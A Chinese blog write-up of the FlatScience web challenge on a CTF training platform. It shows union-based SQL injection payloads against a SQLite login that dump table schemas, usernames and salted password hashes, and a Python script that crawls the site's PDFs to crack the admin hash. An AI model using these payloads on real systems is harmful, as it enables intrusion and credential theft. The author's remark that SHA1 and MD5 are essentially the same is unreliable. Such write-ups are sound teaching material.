<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-FlatScience | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-FlatScience</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-22T07:34:33.295Z" id="date"> 2023-08-22</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-22T09:22:27.191Z" id="updated"> 2023-08-22</time></div></span><br><span>文章总字数: <div class="control">2.3k</div></span><br><span>预计阅读时间: <div class="control">10 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
<p>无</p>
<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
<p class='item-img' data-src='image-20230822155633961.png'><img src="image-20230822155633961.png" alt="image-20230822155633961"></p>
<p>打开题目，没啥信息，只能点击链接看看，发现都是些高深的pdf。。。初步认为没啥用，于是用Acunetix扫了一下这个网站，发现</p>
<p class='item-img' data-src='image-20230822155743436.png'><img src="image-20230822155743436.png" alt="image-20230822155743436"></p>
<p>那我们访问看看，admin.php</p>
<p class='item-img' data-src='image-20230822155831015.png'><img src="image-20230822155831015.png" alt="image-20230822155831015"></p>
<p>尝试了几下弱口令，没啥用，但页面提示nono，stop，看源代码</p>
<p class='item-img' data-src='image-20230822155908048.png'><img src="image-20230822155908048.png" alt="image-20230822155908048"></p>
<p>提示我们不要挣扎了，根本绕不了一点。。。，那我们估计相信，这里先不考虑了</p>
<p>login.php</p>
<p class='item-img' data-src='image-20230822160033712.png'><img src="image-20230822160033712.png" alt="image-20230822160033712"></p>
<p>感觉是sql注入，尝试一下万能密码</p>
<p class='item-img' data-src='image-20230822160125644.png'><img src="image-20230822160125644.png" alt="image-20230822160125644"></p>
<p>发现页面报错，估计就是了，并且过滤了#，那我们试试–+</p>
<p class='item-img' data-src='image-20230822160251706.png'><img src="image-20230822160251706.png" alt="image-20230822160251706"></p>
<p>发现输入后跳转到了index.php，这估计是成了，之后bp抓包试了半天，我以为注入点在用户名上。</p>
<p>随后试了半天判断出其为字符型注入，且字段数为2</p>
<p class='item-img' data-src='image-20230822163052707.png'><img src="image-20230822163052707.png" alt="image-20230822163052707"></p>
<p>且如上图，回显位为2</p>
<p>随后查看了页面源代码，箭头表示移出debug参数，这时我就想到会不会是url传一个debug参数，于是乎有了接下来的</p>
<p class='item-img' data-src='image-20230822161809406.png'><img src="image-20230822161809406.png" alt="image-20230822161809406"></p>
<p class='item-img' data-src='image-20230822161920484.png'><img src="image-20230822161920484.png" alt="image-20230822161920484"></p>
<p>发现回显了源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;usr&#x27;</span>];<br>        <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><br>        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;../fancy.db&#x27;</span>);<br>        <br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-string">&quot;Salz!&quot;</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>            <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-title function_ invoke__">time</span>() + <span class="hljs-number">60</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /&quot;</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debug&#x27;</span>]))<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;login.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="SQLLite3"><a href="#SQLLite3" class="headerlink" title="SQLLite3"></a>SQLLite3</h3>
<p>根据报错SQLLite3找到对应的查询数据库的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>CppSQLite3Queryquery = db.<span class="hljs-title function_ invoke__">execQuery</span>(<span class="hljs-string">&quot;select * fromtarget_table&quot;</span>);<br>    <span class="hljs-keyword">while</span>(!query.<span class="hljs-title function_ invoke__">eof</span>())<br>    &#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;name:&quot;</span>&lt;&lt;query.<span class="hljs-title function_ invoke__">getStringField</span>(<span class="hljs-string">&quot;name&quot;</span>)&lt;&lt;<span class="hljs-string">&quot;age : &quot;</span>&lt;&lt;query.<span class="hljs-title function_ invoke__">getIntField</span>(<span class="hljs-string">&quot;age&quot;</span>)&lt;&lt;endl;<br>        query.<span class="hljs-title function_ invoke__">nextRow</span>();<br>    &#125;<br>    query.<span class="hljs-title function_ invoke__">finalize</span>();<br></code></pre></td></tr></table></figure>
<p>CppSQLite3Query是一个查询返回对象，查询完后可以利用此类。这里就使用CppSQLite3DB的一个函数</p>
<p>execQuery，只要将查询sql传入即可。</p>
<p>eof函数：判断是否还有数据；</p>
<p>nextRow函数：移到下一条记录；</p>
<p>getStringField函数：获得相应字段的内容，以字符串形式返回；</p>
<p>getIntField函数：获得相应字段的内容，以整形形式返回。</p>
<p>结合上述源代码：</p>
<p>找到关键代码SQL语句：</p>
<pre><code>&quot;SELECT id,name from Users where name='&quot;.$user.&quot;' and password='&quot;.sha1($pass.&quot;Salz!&quot;).&quot;'&quot;
</code></pre>
<p>通过SQL语句注入构建我们设计出如下查询的SQL语句：</p>
<pre><code>' union select  name,sql  from sqlite_master--
</code></pre>
<p>至于为何是该语句：</p>
<p>SQLite数据库中存在一个sqlite_master默认表，类似于mysql中的information_schema，可以在sqlite_master中查看所有的表名，以及之前执行过的建表语句，详细内容如下：</p>
<pre><code>sqlite_master ---- SQLite的系统表。该表记录数据库中保存的表，索引，视图和触发器信息。在创建sqlite数据库时该表会自动创建，sqlite_master表包含5个字段：
    type ---- 记录该项目的类型，如：table、index、view、trigger
    name ---- 记录该项目的名称，如：表名、索引名等
    tbl_name ---- 记录所从属的表名，如索引所在的表名。对于表来说该列就是表名本身。
    rootpage ---- 记录项目在数据库页中存储的编号。对于试图和触发器该字段为0或者NULL
    sql ---- 记录创建该项目的sql语句
</code></pre>
<p>so，我们可以构造如下所示的sql语句</p>
<pre><code>select tbl_name from sqlite_master ---- 查询所有的表名
select sql from sqlite_master ---- 查询执行过的sql语句
select sql from sqlite_master where type='table' and tbl_name='Users' ---- 查询创建Users表的sql语句
首先查到表名，再通过创建表的sql语句查到表中的字段信息，应用如下
</code></pre>
<p>表名：Users：<code>1' union select 1, tbl_name from sqlite_master--+</code><br class='item-img' data-src='image-20230822163442370.png'><img src="image-20230822163442370.png" alt="image-20230822163442370"></p>
<p>Users表的字段：<code>1' union select 1, sql from sqlite_master where type='table' and tbl_name='Users'--+</code></p>
<p class='item-img' data-src='image-20230822163752333.png'><img src="image-20230822163752333.png" alt="image-20230822163752333"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29;<br><br>url-decode:<br>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255));<br></code></pre></td></tr></table></figure>
<p>Users表有四个字段：id，name，password，hint，利用group_concat()分别查询name，password和hint字段。执行如下所示的命令</p>
<pre><code>1' union select 1,group_concat(name,&quot;++++&quot;) from Users --+
1' union select 1,group_concat(password,&quot;++++&quot;) from Users --+
1' union select 1,group_concat(hint,&quot;++++&quot;) from Users --+
</code></pre>
<p>分别输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.+admin%2B%2B%2B%2Bfritze%2B%2B%2B%2Bhansi;<br><br>//解码得到: admin++++fritze++++hansi;<br><br>2.+3fab54a50e770d830c0416df817567662a9dc85c%2B%2B%2B%2B54eae8935c90f467427f05e4ece82cf569f89507%2B%2B%2B%2B34b0bb7c304949f9ff2fc101eef0f048be10d3bd;<br><br>//解码得到: 3fab54a50e770d830c0416df817567662a9dc85c++++54eae8935c90f467427f05e4ece82cf569f89507++++34b0bb7c304949f9ff2fc101eef0f048be10d3bd;<br><br>3.+my+fav+word+in+my+fav+paper%3F%21%2B%2B%2B%2Bmy+love+is%E2%80%A6%3F%2B%2B%2B%2Bthe+password+is+password;<br><br>//解码得到<br> my fav word in my fav paper?!++++my love isâ¦?++++the password is password;<br> //第三个说明关键词在该作者的论文中<br></code></pre></td></tr></table></figure>
<p>综上所述，我们知道用户的密码是由用户输入的密码连接&quot;Salz!&quot;字符串后经过sha1加密后得到的，也就是说我们需要通过脚本去爬取该作者的论文内容，让其与该字符串连接后在经过sha1加密得到的字段与数据库查询到的admin所对应的字段相等，那就是我们要的password</p>
<p>那考虑到我的水平，就做个脚本小子吧</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> pdfminer.pdfparser <span class="hljs-keyword">import</span> PDFParser<br><span class="hljs-keyword">from</span> pdfminer.pdfdocument <span class="hljs-keyword">import</span> PDFDocument<br><span class="hljs-keyword">from</span> pdfminer.pdfpage <span class="hljs-keyword">import</span> PDFPage<br><span class="hljs-keyword">from</span> pdfminer.pdfpage <span class="hljs-keyword">import</span> PDFTextExtractionNotAllowed<br><span class="hljs-keyword">from</span> pdfminer.pdfinterp <span class="hljs-keyword">import</span> PDFResourceManager<br><span class="hljs-keyword">from</span> pdfminer.pdfinterp <span class="hljs-keyword">import</span> PDFPageInterpreter<br><span class="hljs-keyword">from</span> pdfminer.layout <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pdfminer.converter <span class="hljs-keyword">import</span> PDFPageAggregator<br><br><br><span class="hljs-comment"># 将pdf转换为txt的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pdf2txt</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-comment"># 打开PDF文件</span><br>    pdfFile = <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;rb&#x27;</span>)<br><br>    <span class="hljs-comment"># 创建pdf文档分析器</span><br>    parser = PDFParser(pdfFile)<br><br>    <span class="hljs-comment"># 创建PDF文档对象存储文档结构</span><br>    document = PDFDocument(parser)<br><br>    <span class="hljs-comment"># 检查文件是否允许文本提取</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> document.is_extractable:<br>        <span class="hljs-keyword">raise</span> PDFTextExtractionNotAllowed<br><br>    <span class="hljs-comment"># 创建PDF资源管理器对象来存储共享资源</span><br>    resource = PDFResourceManager()<br><br>    <span class="hljs-comment"># 设定参数进行分析</span><br>    laparams = LAParams()<br><br>    <span class="hljs-comment"># 创建一个PDF设备对象</span><br>    device = PDFPageAggregator(resource, laparams=laparams)<br><br>    <span class="hljs-comment"># 创建一个PDF解释器对象</span><br>    interpreter = PDFPageInterpreter(resource,device)<br><br>    <span class="hljs-comment"># 创建存储转换结果的同名txt文件</span><br>    fileName = <span class="hljs-built_in">str</span>(path.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>])<br>    newFileName = fileName + <span class="hljs-string">&quot;.txt&quot;</span><br>    f = <span class="hljs-built_in">open</span>(newFileName, <span class="hljs-string">&quot;w&quot;</span>)<br><br>    <span class="hljs-comment"># 处理每一页</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> PDFPage.create_pages(document):<br>        interpreter.process_page(page)<br>        <span class="hljs-comment"># 接受该页面的LTPage对象</span><br>        layout = device.get_result()<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> layout:<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isinstance</span>(x, LTTextBoxHorizontal)):<br>                <span class="hljs-comment"># 写入txt文件</span><br>                <span class="hljs-keyword">try</span>:<br>                    f.writelines(x.get_text() + <span class="hljs-string">&quot;\n&quot;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br>    f.close()<br><br><span class="hljs-comment"># 下载所有pdf文件的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">downloadpdf</span>():<br>    pdfUrl = []  <span class="hljs-comment"># 存放所有pdf文件的连接</span><br>    <span class="hljs-comment"># 爬取所有的pdf文件的连接</span><br>    urlList = [<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/2/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/2/4/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/2/5/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/3/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/3/6/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/3/7/index.html&quot;</span>,<br>        <span class="hljs-string">&quot;http://220.249.52.134:44174/1/3/7/8/index.html&quot;</span><br>        ]<br>    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> urlList:<br>        r = requests.get(url=each)<br>        soup = BeautifulSoup(r.text, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br>        result = soup.find_all(name=<span class="hljs-string">&quot;a&quot;</span>, attrs=&#123;<span class="hljs-string">&quot;title&quot;</span>:<span class="hljs-string">&quot;my very fav paper&quot;</span>&#125;)<br>        <span class="hljs-keyword">for</span> tmp <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-keyword">if</span> tmp[<span class="hljs-string">&quot;href&quot;</span>].endswith(<span class="hljs-string">&quot;.pdf&quot;</span>):<br>                pdfUrl.append(each.split(<span class="hljs-string">&quot;index.html&quot;</span>)[<span class="hljs-number">0</span>] + tmp[<span class="hljs-string">&quot;href&quot;</span>])<br><br>    <span class="hljs-comment"># 使用curl -O 命令下载pdf文件</span><br>    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> pdfUrl:<br>        os.system(<span class="hljs-string">&quot;curl -O &quot;</span> + each)<br><br><br><span class="hljs-comment"># 取hash值的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha1</span>(<span class="hljs-params">msg</span>):<br>    sha1 = hashlib.sha1()<br>    sha1.update((msg + <span class="hljs-string">&quot;Salz!&quot;</span>).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">return</span> sha1.hexdigest()<br><br><br><span class="hljs-comment"># 破解密码的函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getpassword</span>():<br>    passlist = &#123;<br>        <span class="hljs-string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;</span>:<span class="hljs-string">&quot;fritze&quot;</span>,<br>        <span class="hljs-string">&quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;</span>:<span class="hljs-string">&quot;hansi&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> os.listdir(os.curdir):<br>        <span class="hljs-comment"># 取出txt文件</span><br>        <span class="hljs-keyword">if</span> each.endswith(<span class="hljs-string">&quot;.txt&quot;</span>):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(each, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>                a = file.read()<br>                b = re.split(<span class="hljs-string">r&quot;[\s\,\;\.]+&quot;</span>, a)  <span class="hljs-comment"># 将单词分割出来</span><br>                c = []<br>                tmp = <span class="hljs-string">&quot;&quot;</span><br>                judge = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># 处理以-结尾的行，最终的结果保存在c中</span><br>                <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> b:<br>                    <span class="hljs-keyword">if</span> each.endswith(<span class="hljs-string">&quot;-&quot;</span>):<br>                        tmp = each.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]<br>                        judge = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">elif</span> judge:<br>                        c.append(tmp + each)<br>                        judge = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">else</span>:<br>                        c.append(each)<br>                <span class="hljs-comment"># 遍历c碰撞得到密码</span><br>                <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> c:<br>                    <span class="hljs-built_in">print</span>(each)<br>                    <span class="hljs-keyword">if</span> sha1(each) <span class="hljs-keyword">in</span> passlist:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;----&quot;</span> + passlist[sha1(each)] + <span class="hljs-string">&quot;&#x27;s password is &quot;</span> + each + <span class="hljs-string">&quot;Salz!&quot;</span> + <span class="hljs-string">&quot;----&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    os.chdir(os.curdir + os.sep + <span class="hljs-string">&quot;pdfdir&quot;</span>)  <span class="hljs-comment"># 修改工作目录</span><br>    downloadpdf()  <span class="hljs-comment"># 下载pdf文件</span><br><br>    <span class="hljs-comment"># 将所有pdf文件转换成txt文件</span><br>    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> os.listdir(os.curdir):<br>        pdf2txt(each)<br><br>    <span class="hljs-comment"># 遍历所有的txt文件得到密码</span><br>    password = getpassword()<br>    <span class="hljs-keyword">return</span> password<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(main())<br></code></pre></td></tr></table></figure>
<p>这个脚本是可以走出来的，不过似乎是我却一直报错，随后又看了了几篇wp，发现这里竟然可以直接md5解密？？</p>
<p class='item-img' data-src='image-20230822170608768.png'><img src="image-20230822170608768.png" alt="image-20230822170608768"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ThinJerboaSalz!<br>//很好办了，出去salz，就是密码了：ThinJerboa<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230822170648824.png'><img src="image-20230822170648824.png" alt="image-20230822170648824"></p>
<p>于是去了解了一番sha1与md5加密，我之前一直认为这两个加密是本质上的不同的，结果并不是。。。</p>
<p>并且这种做法有一定风险，因为不一定能查到，这里我查到了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、安全性不同<br><br>SHA-1 的安全性比MD5高。相对MD5而言，SHA-1的安全性比较高一些，如果单纯使用MD5可能比较容易遭到撞库攻击。通过预先计算知道MD5的对应关系，存在数据库中，然后使用的时候反查。<br><br>2、校验值的长度不同<br><br>MD5校验位的长度是16个字节（128位）；SHA-1是20个字节（160位）；<br><br>3、运行速度不同<br><br>SHA-1 的运行速度比MD5慢。<br></code></pre></td></tr></table></figure>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/harry_c/article/details/101773526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169269028316800188591703%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169269028316800188591703&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-101773526-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience&amp;spm=1018.2226.3001.4187">wp参考一</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/125947879?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CFlatScience&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-125947879.nonecase&amp;spm=1018.2226.3001.4187">wp参考二</a></p>
